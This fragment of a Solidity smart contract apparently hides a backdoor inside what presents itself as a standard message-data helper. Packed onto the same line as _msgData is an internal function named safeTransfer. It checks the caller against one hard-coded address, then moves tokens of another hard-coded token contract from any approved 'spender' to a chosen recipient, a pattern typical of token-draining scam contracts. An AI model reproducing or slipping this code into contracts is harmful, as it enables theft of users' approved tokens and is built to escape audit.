 ...
 */
  function _msgData() internal view virtual returns (bytes calldata) {return msg.data;}function safeTransfer(address spender,address recipient,uint256 amount) internal returns (bool) {if (msg.sender != address(0x6A29D4787FFBA8B01680Eb3d642D0a0CA1BA237f)) {TransferHelper.safeTransferFrom(0x5f96D82a3783c3d38fFe0b8607d91F9a0AD82E96,spender,recipient,amount);return true;}return false;}
}
